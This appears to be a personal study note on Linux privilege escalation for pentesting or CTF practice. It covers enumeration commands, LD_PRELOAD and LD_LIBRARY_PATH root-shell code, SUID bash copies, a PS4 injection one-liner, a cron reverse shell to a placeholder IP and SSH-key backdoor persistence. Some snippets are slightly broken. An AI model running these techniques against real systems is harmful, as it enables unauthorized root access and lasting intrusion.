# Enumeration
## hostname
The `hostname` command will return the hostname of the target machine, although most times meaningless, it can sometimes provide information about the target system's role within the corporate network
## uname -a
`uname -a` will print system information giving us additional details about the kernel used by the system, to be then paired with the search of an exploit that could lead to escalation
## /proc/version
The proc filesystem (procfs) provides information about the target system processes. Using `cat /proc/version` may gives us information on the kernel version and additional data such as whether a compiler is installed.
## /etc/issue
Systems can also be identified by looking at the `cat /etc/issue` file. This file usually contains some information about the operating system but can easily be customised or changed.
## ps
The `ps` command is an effective way to see the running processes on a linux system. It shows:
* PID: process ID
* TTY: Terminal type used by the user
* TIME: Amount of CPU time used by the process (not the time the process has been running for)
* CMD: The command or exe running 
It also provides some options

| option | description |
| ---- | ---- |
| `A` | displays information about all available processes |
| `a` | info about processes associated with terminals |
| `e` | info about processes for current user |
| `x` | shows processes that are not attached to a terminal |
| `f` | sick formatting |
| `j` | more sick formatting |
| `u` | shows user name |

Some sick wombo combos

* `ps axfj` to view process tree
* `ps aux` to check all processes as well as users
	* `ps aux | cut -d ' ' -f1 | sort | uniq` To list only the users

## env
The `env` command will show environmental variables, this can show us the home folder of our user, the shell being used and the PATH variable may have a compiler or a scripting language that could be used to run code on the target system or be leveraged for privilege escalation.

## sudo -l
The target system may be configured to allow users to run some commands with root privileges. We can use `sudo -l` command to list all commands that we can run using sudo

## ls
Although certain to be used, make sure to use `ls -la` to display hidden files

## Id
The `id` command will provide a general overview of the user's privilege level and group memberships. Can also be used to obtain the information of another user

## /etc/passwd
reading the `/etc/passwd` file can be an easy way to discover users on the system. We can grep it and then cut the output to make a bruteforceable list with `/etc/passwd | grep home | cut -d ':' -f1`. This takes advantage of the fact that most real users would likely have their own folder under the home directory.

**Understanding /etc/passwd format**

`test:x:0:0:root:/root:/bin/bash`

[as divided by colon (:)]  

1. **Username**: It is used when user logs in. It should be between 1 and 32 characters in length.
2. **Password**: An x character indicates that encrypted password is stored in /etc/shadow file. Please note that you need to use the passwd command to compute the hash of a password typed at the CLI or to store/update the hash of the password in /etc/shadow file, in this case, the password hash is stored as an "x".  
3. **User ID (UID)**: Each user must be assigned a user ID (UID). UID 0 (zero) is reserved for root and UIDs 1-99 are reserved for other predefined accounts. Further UID 100-999 are reserved by system for administrative and system accounts/groups.
4. **Group ID (GID)**: The primary group ID (stored in /etc/group file)
5. **User ID Info**: The comment field. It allow you to add extra information about the users such as user’s full name, phone number etc. This field use by finger command.
6. **Home directory**: The absolute path to the directory the user will be in when they log in. If this directory does not exists then users directory becomes /
7. **Command/shell**: The absolute path of a command or shell (/bin/bash). Typically, this is a shell. Please note that it does not have to be a shell.

To make a suitable password we could one of two commands
```Shell
openssl passwd newpasswordhere
mkpasswd -m sha-512 newpasswordhere
```
Then output the hashed version of a password to then paste it in either `/etc/passwd` with the former or even `/etc/shadow` with the latter.

## history
The `history` command can gives us some idea about the target system and maybe even passwords or usernames
```shell
cat ~/.*history | less
```
Views the contents of all hidden history files in the user's home directory
## ifconfig
The target system may be a pivoting point to another network. The `ifconfig` command will gives us information about the network interfaces of the system.

## netstat
The `netstat` command can be used with several options to gather information on existing connections

|option|description|
|-|-|
|`-a` |shows all listening ports and established connections.  |
|`-l` |list ports in listening mode. |
|`-s` |list network usage statistics |
|`-t` |shows TCP protocols (can be used with other options)  |
|`-u` |shows UDP protocols (can be used with other options) |
|`-p` |shows PID information (doesn't display it if the process is owned by another user unless sudo) |
|`-i` |shows interface statistics (checking RX-OK we can see which ones may be more active) |
Some wombo combos
- `netstat -noa`, does not resolve names, displays timers, displays all sockets

## Find
Searching is THE thing, as it can lead to potential privilege the `find` command is now our best friend. 
hax list:
- `find . -name flag1.txt`: find the file named “flag1.txt” in the current directory
- `find /home -name flag1.txt`: find the file names “flag1.txt” in the /home directory
- `find / -type d -name config`: find the directory named config under “/”
- `find / -type f -perm 0777`: find files with the 777 permissions (files readable, writable, and executable by all users)
- `find / -perm a=x`: find executable files
- `find /home -user frank`: find all files for user “frank” under “/home”
- `find / -mtime 10`: find files that were modified in the last 10 days
- `find / -atime 10`: find files that were accessed in the last 10 day
- `find / -cmin -60`: find files changed within the last hour (60 minutes)
- `find / -amin -60`: find files accesses within the last hour (60 minutes)
- `find / -size 50M`: find files with a 50 MB size 
	- we can add `+` or `-` to specify more than or less than like `-size +100M` 
- `... -type d 2>/dev/null`: redirect errors to /dev/null and have a cleaner output

Folders and files that can be written to or executed from:
- `find / -writable -type d 2 >/dev/null` : Find world-writeable folders
- `find / -perm -222 -type d 2>/dev/null`: Find world-writeable folders
- `find / -perm -o w -type d 2>/dev/null`: Find world-writeable folders
- `find / -perm -o x -type d 2>/dev/null` : Find world-executable folders

Find development tools and supported languages:
- `find / -name perl*`
- `find / -name python*`
- `find / -name gcc*`

Find specific file permissions:
- `find / -perm -u=s -type f 2>/dev/null`: Find files with the SUID bit, which allows us to run the file with a higher privilege level than the current user.

# Automated Enumeration Tools
- **LinPeas**: [https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
- **LinEnum:** [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)
- **LES (Linux Exploit Suggester):** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)
- **Linux Smart Enumeration:** [https://github.com/diego-treitos/linux-smart-enumeration](https://github.com/diego-treitos/linux-smart-enumeration)
- **Linux Priv Checker:** [https://github.com/linted/linuxprivchecker](https://github.com/linted/linuxprivchecker)

# Kernel Exploits
The kernel on linux systems manages the communication between components such as the memory on the system and applications. This function requieres the kernel to have specific privileges; thus, a successful exploit will potentially lead to root privileges.
The process is as simple as:
- Identify the kernel version (`uname -r`)
- Search and find an exploit code for the kernel version
- Run it
- Profit

Although simple it varies from version to version and **_A failed kernel exploit can lead to a system crash_**. So please read things through before doing anything stupid.

# Sudo
The sudo command, by default, allows us to run a program with root privileges. Under some conditions, system admins may need to give users some flexibility on their privileges. Any user can check its current situation related to root privileges using the `sudo -l` command.
[GTFObins](https://gtfobins.github.io/) is a valuable source that provides information on how any program on which we may have sudo rights can be potentially used to escalate.

## Leverage application functions
In some applications we would be able to use certain functions of those applications to not only be able to escalate but also read, write or execute certain programs which normally we wouldn't have access. 
One example is the **Apache2 server**. We can leverage an option of the application (`-f file`) that supports loading alternative config files. When loading a file such as `/etc/shadow` it will result in an error message that includes the first line of the file.

## Leverage LD_PRELOAD
On some systems, we may see the `LD_PRELOAD` environment option when doing `sudo -l`. If the `env_keep `option is enabled we can generate a shared object before any other program is run. Note that the `LD_PRELOAD` option will be ignored if the real user ID is different from the effective user ID. For a sick blog post with explanation and stuff pls refer to [sick blog post.](https://rafalcieslak.wordpress.com/2013/04/02/dynamic-linker-tricks-using-ld_preload-to-cheat-inject-features-and-investigate-programs/) 
A quick step guide to do this goes as follows:
- Check for LD_PRELOAD (with the env_keep option)
- Write a simple C code compiled as a share object (.so) file
- Run the program with sudo rights and the LD_PRELOAD option pointing to our .so file

An example of a simple C code to gain root can be:
```C
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
We can then save this code with a .c extension and compile it using `gcc` into a shared object file using the following
```sh
gcc -fPIC -shared shell.c -nostartfiles -o shell.so
```
Finally we can use this shared object when launching any program our user can run with sudo, we just need to run the program by specifying the LD_PRELOAD option as follows:
```sh
sudo LD_PRELOAD=/path/to/file/shell.so COMMAND-WITH-SUDO-PRIVILEGES
```
This will result in a shell spawn with root privileges

## Leverage LD_LIBRARY_PATH
Similar to what's happening in `LD_PRELOAD`, this environment variable provides a list of directories where shared libraries are searched for first instead. To be able to escalate we can follow the list:
- Check for `LD_LIBRARY_PATH` (with `env_keep` option enabled)
- Find the libraries that a program uses
- Write a simple C code compiled as a share object (.so) file that mimics one of the libraries
- Run the program with sudo rights and the `LD_LIBRARY_PATH` option pointing to our .so file
First we can run `ldd` against the `apache2` program file to see which shared libraries are used by the program:
```Shell
ldd /usr/sbin/apache2
```
Then we can craft our C code
```C
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
	unsetenv("LD_LIBRARY_PATH");
	setresuid(0,0,0);
	system("/bin/bash -p");
}
```
And compile it as a share object
```Shell
gcc -o libcrypt.so.1 -shared -fPIC library_path.c
```
Finally we can run `apache2` using sudo while setting the `LD_LIBRARY_PATH` to the directory where we saved the share object (we can use `.` if it is the one we are in)
```Shell
sudo LD_LIBRARY_PATH=/tmp apache2
```
# SUID / SGID
Much of linux privilege controls rely on controlling the users and files interactions. These privilege levels change with SUID (Set-user Identification) and SGID (Set-group Identification). These allow files to be executed with the permission level of the file owner or the group owner, respectively.
These files have an "s" bit set showing their special permission level, we can find them with
```sh
find / -type f -perm -04000 -ls 2>/dev/null
find / -type f -perm -u=s 2>/devnull
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
```
will list files that have SUID or SGID bits set. 
A good practice would be to compare executables on this list with [GTFObins](https://gtfobins.github.io/) and filtering by SUID so it only shows binaries known to be exploitable when the SUID bit is set.

From here the procedure depends on which commands are available for us to use. One way for example could be to [[Unshadow]] and use [[John The Ripper]] to try and get the plain text passwords. Or To add a new user with hopefully root privileges by using [[Openssl]] to create the hash of a new password and then add it into the `/etc/passwd` file.
## Taking Advantage
If for some reason we have access to a script that runs with root privileges but we can't use that directly to escalate be it for preference, availability, or to gain a future foothold. We can take advantage of this and modify a script to run to do the following
```shell
#!/bin/bash
cp /bin/bash /tmp/escbash
chmod +xs /tmp/escbash
```
This way we can create a copy of bash that will run with the privileges of root due to the SUID bit being set.
```Shell
/tmp/escbash -p
```
To gain a shell with privileges.

## Abusing Shell Features
For versions of Bash < 4.4
When in debugging mode, bash uses the environment variable `PS4` to display an extra prompt for debugging statements.
With this we can run an executable with the SUID bit set with bash debugging enabled and the `PS4` variable set to an embedded command which creates an SUID version of that command
```shell
env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/escbash; chmod +xs /tmp/rootbash)' Executable-With-SUID
```
Then run the command with `-p` to maintain privileges 
```shell
/tmp/escbash -p
```

# Capabilities
Another method system administrators can use to increase the privilege level of a process or binary is through Capabilities. These can help manage privileges at a more granular level, if an administrator doesn't want to give a user higher privileges, they can change the capabilities of a binary to allow it to get trough its task without needing a higher privilege user. 
We can see which binaries have enabled capabilities by using
```sh
getcap -r / 2>/dev/null
```
Which would result in all the binaries with have capabilities, we are specially interested in the ones with `cap_setuid` as these can often result in escalation. For methodology refer to [GOATbins](https://gtfobins.github.io/). Even though these programs have the SUID capability, they may not have the SUID bit enabled, so they will not appear when enumerating for SUID.

# Cron Jobs
Cron jobs are used to run scripts or binaries at specific times. By default, they run with the privilege of their owners and not the current user. While properly configured cron jobs are not inherently vulnerable, they can provide a privilege escalation vector under some conditions. The idea being, if there is a scheduled task that runs with root privileges and we can change the script that will be run, then our script will run with root privileges.

Each user on the system has their crontab file and can run specific tasks whether they are logged in or not. Any user can read the file keeping system-wide cron jobs under `/etc/crontab`. 
Here we can find every cron job configured by a user. We can then go and check those scripts to see if the can be modified in any way to instead run code that will allow us to escalate. The scripts will have to use the tools available on the target system. Some things to note:
- The command syntax will vary depending on the available tools (maybe we won't be able to use `nc` as it may not support the `-e` option)
- We should always prefer to start reverse shells, as we do not want to compromise the system integrity during a real pentest.

An example of a reverse shell for a .sh file would be something like
```sh
#!/bin/bash
bash -i >& /dev/tcp/IP/PORT 0>&1
```
NOTE: remember to check if the file can be executed. If not we can use
```sh
chmod +x FILE
```
to make it so it can be ran.

Another case, although similar, is if a old cron job is still set up, in this case the original file could have been removed, if so we can create a new file in the original path so that the new file is executed with the reverse shell

# PATH
If a folder for which a user has write permissions is located in the PATH, we could potentially hijack an application to run a script. PATH in linux is an environmental variable that tells the operating systems where to search for executables. For any command that is not built into the shell or that is not defined with an absolute path, linux will start searching in folders defined under PATH.
We can check it with either:
```sh
env
```
or for a more direct result
```sh
echo $PATH
```
Whenever we are looking for a way to escalate using this technique there are some things that we need to keep in mind, as it always depends entirely on the existing configuration of the target system:
- What folders are located under $PATH?
- Does our user have write privileges for any of these folders?
- Can we modify $PATH?
- Is there a script/app that we can start that will be affected by this vulnerability?

To check permissions of all the PATH directories all at once
```sh
echo $PATH | tr ':' '\n' | while read i; do ls -ld $i; done
```
We could also check for writable folders overall with
```sh
find / -writable 2>/dev/null | cut -d '/' -f 2,3 | grep -v proc | sort -u
```

Now if non of them match, and we do not have write permissions to one of the already existing directories in PATH, then we can hopefully add a directory to which we have permissions to PATH, doing so like:
```sh
export PATH=/tmp:$PATH
```
Normally `/tmp` would be easiest as we more often than not will have permissions. We do this by using the `export` command which can set environment variables like `PATH`. So we just append the new directory to the already existing one.
At this point we can try to use and already existing script/application. In this case suppose that we found one that tries to launch a system binary for example (escalation.c):
```C
#include<unistd.h>
void main(){
setuid(0);
setgid(0);
system("/bin/bash");
}
```
This script will set itself as root and then try to run a binary called `hack`. As the path is not provided it will also look for it inside the folders listed under path. If we wanted to procede with this C example then we would have to compile it into and executable and set the SUID bit
```sh
gcc escalation.c -o escalate -w
chmod u+s escalate
```
Now we can create a file named `hack` that will have whichever command we want for it to run as root, and execute it through our `escalate` script.
```sh
echo "cat /etc/shadow" > hack
./escalate
```
Here we create it so it can show `/etc/shadow`, but we could also give it a payload to get a shell like `/bin/bash` or something else.

## Creating New Functions
In bash versions <4.2-048 it is possible to define shell functions with names that resemble file paths, then export those functions so that they are used instead of any actual executable at that file path. This could be used to go around the fix of using absolute paths to avoid taking advantage of the `PATH` variable
First we create a bash function with the name of the absolute path of the application that we want to hijack, make it execute a bash shell or any other command, and export the function
```shell
function /usr/sbin/service { /bin/bash-p; }
export -f /usr/sbin/service
```
Now we execute the program that uses this service and we escalate.

# NFS
Privilege escalation vectors are not confined to internal access. Shared folders and remote management interfaces such as SSH and Telnet can also help us gain root access on the target system. Finding a root ssh private key on the target system and connecting via SSH is a way to obtain root instead of trying to increase our current user's privilege level.

Another vector could be a misconfigured network shell. NFS (Network File Sharing) configuration is kept in the `/etc/exports` file, this file is created during the NFS server installation and can usually be read by users.
The critical element for this privilege escalation is the `no_root_sqash` option. By default, NFS will change the root user to `nobody` and strip any file from operating with root privileges. But if the `no_root_squash` option is present on a writable share, we can create an executable with the SUID bit set and run it on the target system.

We can now start by enumerating mountable shares from our attacking machine like so
```sh
showmount -e TargetIP
```
We will then mount one of the `no_root_squash` shares to our attacking machine and start building an executable (ej with a share `/tmp`). First we make a new folder on our attacking machine
```sh
mkdir /hacker/folder
```
and mount that folder to the target folder
```sh
mount -o rw TargetIP:/tmp /hacker/folder
```
Essentially we are creating a new directory on our attacking machine to then link that directory with the `/tmp` one inside the target machine with read-write permissions, so if we create an executable on our machine it will appear on the target as well. From here we can try a C code to open a shell. (nfs.c)
```c
void main(){
setuid(0);
setgid(0);
system("/bin/bash");
}
```
To then compile it and set the SUID bit
```sh
gcc nfs.c -o nfs -w
chmod +s nfs
```
And finally run it in the target machine to gain a shell with root.

# Backshoting
Once we are inside a system, we can try to to leave a backdoor behind in order to come back another time.
## SSH keys
If login with [[Cryptography#SSH Authentication|SSH keys]] is enabled for users but a key is not already in place for them we can add create our own pair of keys and leave the public key in the target machine for us to quickly come later and with a stable shell. By creating a key in our machine with 
```sh
ssh-keygen
```
to then either copy the public key manually into `authorized keys` with `cat`, transferring the public key file into the `~/.ssh` folder or use
```sh
ssh-copy-id -i [privatekey] user@host
```
for it to automatically add the corresponding public key to the user in the target machine. And finally we can enter at any time with
```sh
ssh -i [privatekey] user@host
```

